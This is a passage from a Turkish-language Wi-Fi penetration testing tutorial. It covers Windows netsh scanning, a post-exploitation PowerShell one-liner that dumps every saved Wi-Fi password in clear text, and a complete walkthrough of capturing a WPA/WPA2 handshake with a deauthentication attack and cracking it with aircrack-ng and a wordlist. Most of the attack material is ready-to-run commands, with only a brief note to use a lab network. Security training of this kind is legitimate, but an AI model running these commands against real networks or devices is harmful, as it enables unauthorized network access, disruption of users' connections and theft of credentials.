> **Profesyonel Yaklaşım:** Bu kısıtlamalar nedeniyle, ciddi bir Wi-Fi sızma testi için en etkili ve profesyonel yöntem, bir Sanal Makine (VMware/VirtualBox) üzerine Kali Linux kurmak ve USB Wi-Fi adaptörünü bu sanal makineye bağlamaktır. Bu sayede Windows'un kısıtlamalarından kurtulup Linux'un tüm gücünden faydalanabilirsiniz.

Ancak bu, Windows'un tamamen işe yaramaz olduğu anlamına gelmez. Özellikle **pasif keşif** ve **sızma sonrası bilgi toplama (post-exploitation)** aşamalarında oldukça yeteneklidir.

### 3.2. Yerel Komut Satırı ile Keşif (`netsh`)

`netsh` (Network Shell), Windows'un güçlü bir komut satırı ağ yapılandırma aracıdır. `netsh wlan` komutları ile Wi-Fi arayüzleri hakkında birçok bilgi edinebiliriz.

#### Çevredeki Ağları Tarama (`show network`)

Bu komut, `airodump-ng`'nin yaptığı gibi ham paketleri yakalamaz, ancak sürücü aracılığıyla işletim sistemine rapor edilen AP'leri listeler.

1.  **Basit Tarama (`mode=ssid`):**
    Bu komut, çevredeki ağların SSID'lerini (ağ adlarını) listeler.
    ```powershell
    netsh wlan show network
    ```
2.  **Detaylı Tarama (`mode=bssid`) ve Çıktı Analizi:**
    Bu komut, her bir AP hakkında çok daha detaylı bilgi verir.
    ```powershell
    netsh wlan show network mode=bssid
    ```
    Çıktıda her bir ağ için şu bilgileri görebilirsiniz:
    *   `SSID`: Ağın adı.
    *   `Network type`: Ağ türü (Infrastructure).
    *   `Authentication`: Kimlik doğrulama (WPA2-Personal, WPA3-Personal vb.).
    *   `Encryption`: Şifreleme (CCMP, GCMP).
    *   `BSSID`: AP'nin MAC adresi.
    *   `Signal`: Sinyal gücü (yüzde olarak).
    *   `Channel`: AP'nin çalıştığı kanal.

Bu bilgiler, bir hedef belirlemek ve Kali Linux'ta yapacağınız saldırıyı planlamak için (örneğin, hangi kanala odaklanacağınızı bilmek) son derece değerlidir.

#### Sızma Sonrası Bilgi Toplama (Post-Exploitation)

Bir Windows sistemine erişim sağladığınızda, `netsh` en değerli araçlarınızdan biri haline gelir. Sistemde daha önce bağlanılmış olan tüm Wi-Fi ağlarının şifrelerini açık metin olarak elde edebilirsiniz.

1.  **Kayıtlı Profilleri Listeleme (`show profiles`):**
    Bu komut, bilgisayarda kayıtlı olan tüm Wi-Fi ağ profillerini listeler.
    ```powershell
    netsh wlan show profiles
    ```
2.  **Kayıtlı Şifreleri Açık Metin Olarak Görme (`key=clear`):**
    Belirli bir profilin şifresini görmek için:
    ```powershell
    netsh wlan show profile name="<Profil_Adı>" key=clear
    ```
    Çıktıda, "Security settings" bölümü altında "Key Content" satırında ağın şifresini göreceksiniz. Bu komutu yönetici hakları olmadan da çalıştırabilirsiniz.

3.  **PowerShell ile Otomatik Bilgi Çıkarma:**
    Tüm kayıtlı profillerin şifrelerini tek seferde çekmek için basit bir PowerShell betiği kullanabilirsiniz.
    ```powershell
    # Tüm Wi-Fi profillerini ve şifrelerini listeleyen PowerShell komutu
    (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content|SSID name" | Write-Host
    ```

### 3.3. GUI Tabanlı Analiz Araçları

Windows'ta komut satırına ek olarak, pasif Wi-Fi analizi yapabilen bazı grafik arayüzlü (GUI) araçlar da bulunmaktadır.

#### Microsoft Network Monitor 3.4 (Arşivlenmiş Araç)

Bu araç artık Microsoft tarafından desteklenmese de hala bulunup kullanılabilir. Windows'ta monitor modu "taklit etmeye" çalışan nadir araçlardan biridir, ancak modern adaptörlerle uyumluluğu sınırlıdır.

*   **Kurulum Adımları:**
    1.  Microsoft Network Monitor 3.4'ü internet arşivlerinden bulun ve kurun.
    2.  Kurulum sırasında "Network Monitor drivers" seçeneğinin işaretli olduğundan emin olun.
*   **Monitor Modda Paket Yakalama:**
    1.  Programı yönetici olarak çalıştırın.
    2.  "New Capture" sekmesini açın.
    3.  Sol üstteki "Capture Settings" penceresinde, Wi-Fi adaptörünüzü bulun. Özelliklerinde "Monitor Mode" seçeneği varsa, bunu işaretleyin.
    4.  "Start" butonuna basarak paket yakalamayı başlatın.
*   **Yakalanan Veriyi Kaydetme ve Wireshark ile Analiz Etme:**
    Yakalanan trafiği `.cap` formatında kaydedip, daha detaylı analiz için Wireshark'ta açabilirsiniz. Bu yöntem, Windows üzerinde 802.11 yönetim çerçevelerini (Beacon, Probe vb.) yakalamak için bir yol sunar, ancak packet injection yapamaz.

#### Diğer Pasif Analiz Araçları

Bu araçlar monitor mod kullanmazlar, ancak Windows'un sunduğu bilgileri kullanıcı dostu bir arayüzde gösterirler. Kanal çakışmalarını, sinyal güçlerini ve ağ yapılandırmalarını görselleştirmek için harikadırlar.

*   **Acrylic Wi-Fi Home:** Ücretsiz sürümü, çevredeki AP'ler, sinyal seviyeleri (RSSI), kanallar ve güvenlik bilgileri hakkında detaylı bilgi sunar.
*   **inSSIDer:** Ağ sorunlarını gidermek için tasarlanmış bir araçtır. Kanalların nasıl kullanıldığını gösteren grafikleri sayesinde, en az yoğun olan kanalı bulmak için idealdir.

---

## Bölüm 4: Uygulamalı Saldırı Senaryosu: WPA/WPA2 Handshake Yakalama ve Kırma

Bu bölümde, önceki bölümlerde öğrendiğimiz teorik bilgileri ve araçları bir araya getirerek, en yaygın Wi-Fi saldırılarından birini baştan sona gerçekleştireceğiz: **WPA/WPA2 Korumalı bir ağın 4-Yollu El Sıkışmasını (4-Way Handshake) yakalayıp, offline olarak şifresini kırmak.**

> **Ortam:** Bu senaryo, Bölüm 1'de anlatıldığı gibi hazırlanmış bir Kali Linux ortamı ve monitor mod destekli bir USB Wi-Fi adaptörü gerektirir. Saldırı, **kendi kontrolünüzdeki bir laboratuvar ağına** karşı yapılmalıdır.

### 4.1. Senaryoya Genel Bakış ve Hedefler

*   **Amaç:** WPA/WPA2-PSK (Pre-Shared Key) ile korunan bir hedef ağın şifresini ele geçirmek.
*   **Yöntem:**
    1.  Hedef ağı ve ona bağlı bir istemciyi keşfetmek.
    2.  Hedef ağın trafiğini dinleyerek paket yakalamaya başlamak.
    3.  Hedef istemciyi ağdan düşürmek için bir Deauthentication (Deauth) saldırısı yapmak.
    4.  İstemci yeniden bağlanırken oluşan 4-yollu el sıkışmayı (handshake) yakalamak.
    5.  Yakalanan handshake'i bir sözlük (wordlist) kullanarak kırmak.
*   **Kullanılacak Araçlar:** `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`.

### 4.2. Adım 1: Hazırlık ve Keşif

İlk adımımız, saldırı için adaptörümüzü hazırlamak ve çevremizdeki potansiyel hedefleri tespit etmektir.

1.  **Monitor Modu Etkinleştirme:**
    Terminali açın ve `wlan0` arayüzünü monitor moda alın.
    ```bash
    # Çakışan işlemleri durdur
    sudo airmon-ng check kill

    # wlan0'ı monitor moda al (arayüzünüzün adı farklı olabilir)
    sudo airmon-ng start wlan0

    # Monitor mod arayüzümüzün adını kontrol edelim (genellikle wlan0mon)
    iwconfig
    ```

2.  **Çevredeki Ağları Tarama:**
    Şimdi `airodump-ng` ile etraftaki tüm Wi-Fi ağlarını ve istemcileri görelim.
    ```bash
    sudo airodump-ng wlan0mon
    ```

    Bu komutun çıktısını bir süre izleyin. Hedef olarak kendi laboratuvar ağınızı seçin. Bu ağ hakkında aşağıdaki bilgileri not edin:
    *   **BSSID:** Hedef AP'nin MAC adresi (Örn: `C0:A1:B2:C3:D4:E5`).
    *   **CH:** Hedef AP'nin çalıştığı kanal (Örn: `6`).
    *   **ESSID:** Hedef AP'nin adı (Örn: `EvdekiTestAgi`).
    *   **STATION:** Hedef AP'ye bağlı bir istemcinin MAC adresi (Örn: `F8:E7:D6:C5:B4:A3`). Eğer bağlı istemci yoksa, kendi telefonunuzu veya başka bir cihazı ağa bağlayın.

### 4.3. Adım 2: Hedef Ağa Odaklanma ve Paket Yakalama

Genel keşfi tamamladığımıza göre, şimdi sadece hedef ağımıza odaklanarak dinleme yapacağız ve yakaladığımız paketleri bir dosyaya kaydedeceğiz.

1.  **Hedefli Dinlemeyi Başlatma:**
    Yeni bir terminal açın. `airodump-ng`'yi bu kez hedef bilgilerimizle birlikte çalıştırın.
    ```bash
    # --bssid <Hedef_AP_MAC> --channel <Hedef_Kanal> -w <Kayit_Dosya_Adi> <Monitor_Arayuz>
    sudo airodump-ng --bssid C0:A1:B2:C3:D4:E5 --channel 6 -w test_agi_yakalama wlan0mon
    ```
    *   `--bssid C0:A1:B2:C3:D4:E5`: Sadece bu AP'ye odaklan.
    *   `--channel 6`: Adaptörü 6. kanala sabitle, kanal atlamayı durdur.
    *   `-w test_agi_yakalama`: Yakalanan paketleri `test_agi_yakalama` ön ekiyle başlayan dosyalara kaydet (örn: `test_agi_yakalama-01.cap`).
    *   `wlan0mon`: Kullanılacak monitor arayüzü.

    Bu terminali açık bırakın. `airodump-ng` çalışırken, ekranın sağ üst köşesinde **"WPA handshake: [BSSID]"** mesajını görene kadar bekleyeceğiz. Bu mesaj, handshake'i başarıyla yakaladığımız anlamına gelir.

### 4.4. Adım 3: Handshake Yakalamayı Hızlandırma (Deauthentication Saldırısı)

Normalde, bir istemci ağdan ayrılıp tekrar bağlandığında bir handshake oluşur. Ancak bunu beklemek uzun sürebilir. Bu süreci hızlandırmak için `aireplay-ng` ile meşru bir istemciye deauth paketi göndererek onu ağdan zorla düşüreceğiz. Cihaz otomatik olarak yeniden bağlanmaya çalışacak ve bu sırada handshake oluşacaktır.

1.  **Deauth Saldırısını Gerçekleştirme:**
    **Yeni bir terminal daha açın** (`airodump-ng` çalışmaya devam etmeli).
    ```bash
    # --deauth <Paket_Sayisi> -a <Hedef_AP_MAC> -c <Hedef_Istemci_MAC> <Monitor_Arayuz>
    sudo aireplay-ng --deauth 3 -a C0:A1:B2:C3:D4:E5 -c F8:E7:D6:C5:B4:A3 wlan0mon
    ```
    *   `--deauth 3`: 3 adet deauthentication paketi gönder. Genellikle bu yeterlidir.
    *   `-a C0:A1:B2:C3:D4:E5`: Deauth paketinin "kaynak" adresi olarak AP'nin MAC adresini taklit et.
    *   `-c F8:E7:D6:C5:B4:A3`: Bu paketleri bu istemciye gönder.

2.  **Handshake'i Doğrulama:**
    `aireplay-ng` komutunu çalıştırdıktan hemen sonra, `airodump-ng`'nin çalıştığı diğer terminale geri dönün. Ekranın sağ üst köşesinde **"WPA handshake: C0:A1:B2:C3:D4:E5"** gibi bir mesaj görmelisiniz.

    Eğer bu mesajı gördüyseniz, tebrikler! Handshake başarıyla `.cap` dosyanıza kaydedildi. Artık `airodump-ng` ve `aireplay-ng` pencerelerini `Ctrl+C` ile kapatabilirsiniz.

### 4.5. Adım 4: Handshake'i Kırma (Offline Saldırı)

Artık elimizde şifreyi kırmak için gereken her şey var: içinde handshake bulunan bir `.cap` dosyası. Şimdi `aircrack-ng` ve bir sözlük dosyası kullanarak şifreyi bulmaya çalışacağız.

1.  **`aircrack-ng` ile Saldırıyı Başlatma:**
    Kali Linux'ta popüler bir sözlük olan `rockyou.txt` genellikle `/usr/share/wordlists/` dizininde bulunur.
    ```bash
    # -w <Sözlük_Dosyası> <Yakalanan_Cap_Dosyası>
    aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz test_agi_yakalama-01.cap
    ```
    *   `-w /usr/share/wordlists/rockyou.txt.gz`: `aircrack-ng`, `.gz` ile sıkıştırılmış sözlükleri doğrudan okuyabilir.
    *   `test_agi_yakalama-01.cap`: Az önce handshake'i yakaladığımız dosya.

2.  **Sonucu Bekleme:**
    `aircrack-ng`, sözlükteki her kelimeyi denemeye başlayacaktır. İşlem, sözlüğün büyüklüğüne ve bilgisayarınızın işlemci gücüne bağlı olarak saniyelerden saatlere, hatta günlere kadar sürebilir.

    Eğer hedef ağın şifresi sözlüğünüzde mevcutsa, `aircrack-ng` işlemi durduracak ve şu çıktıyı verecektir:
    ```
    KEY FOUND! [ 12345678 ]
    ```
    `[ ]` içinde yazan değer, ağın Wi-Fi şifresidir.

### 4.6. Senaryo Özeti ve Sonuç

Bu uygulamalı bölümde, bir WPA/WPA2 ağının güvenliğini test etme sürecini adım adım tamamladık:

1.  `airmon-ng` ile adaptörü hazırladık.
2.  `airodump-ng` ile hedefi keşfettik ve dinlemeye başladık.
3.  `aireplay-ng` ile istemcinin bağlantısını kopararak handshake oluşumunu tetikledik.
4.  `aircrack-ng` ile yakalanan handshake'i offline bir sözlük saldırısıyla kırdık.

Bu saldırının başarısının **tamamen sözlüğünüzün kalitesine bağlı olduğunu** unutmayın. Gerçek hayattaki bir sızma testinde, hedefe özel (örneğin, şirket adı, hedefle ilgili tarihler, isimler vb. içeren) sözlükler oluşturmak başarı şansını önemli ölçüde artırır. Ayrıca, GPU destekli kırma araçları (Hashcat gibi) bu süreci binlerce kat hızlandırabilir.

**Saldırı sonrası temizlik:**
İşiniz bittiğinde, adaptörünüzü normal moduna döndürmeyi unutmayın.
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
